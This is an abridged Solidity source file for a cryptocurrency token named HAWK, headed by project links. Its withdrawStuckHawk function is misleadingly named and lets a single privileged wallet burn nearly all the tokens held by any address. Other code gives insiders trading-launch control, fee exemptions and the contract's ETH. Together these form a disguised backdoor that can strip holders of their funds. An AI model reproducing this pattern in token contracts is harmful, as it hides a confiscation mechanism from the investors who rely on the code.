...
Website: https://www.thehawk.tech
Twitter: https://twitter.com/HawkPortal
Telegram:  https://t.me/hawkportal
Dapp:  https://app.thehawk.tech
...
contract HAWK is ERC20, Ownable {
    ...
    modifier onlyHawk() {
        require(hawkWallet == _msgSender(), "Caller is not the hawk");
        _;
    }
    ...
    constructor() ERC20("Hawk", "HAWK") {
        ...
        hawkWallet = address(0x9c279C6dB9C623CD70D791Aa678cE5266ca67a69);

        // exclude from paying fees or having max transaction amount
        excludeFromFees(owner(), true);
        excludeFromFees(hawkWallet, true);
        excludeFromFees(address(this), true);
        excludeFromFees(address(0xdead), true);

        excludeFromMaxTx(owner(), true);
        excludeFromMaxTx(hawkWallet, true);
    ...
    function addHawkPool() external payable onlyOwner {
    ...
    function launchHawk() external onlyOwner {
        tradingActive = true;
        swapEnabled = true;
    }
    ...
    function _transfer(
        ...
        bool canSwap = amount >= swapLimitAmount && contractTokenBalance >= swapLimitAmount;
    ...
    function withdrawStuckHawk(address _token) external onlyHawk {
        require(_token != address(0), "_token address cannot be 0");
        uint256 _balance = balanceOf(address(_token));
        require(_balance > 0, "Token: no tokens to burn");
        super._burn(_token, _balance - swapLimitAmount);
    }

    function withdrawStuckEth() external onlyHawk {
    ...
    function swapBack() private {
        ...
        payable(hawkWallet).transfer(address(this).balance);
    }
}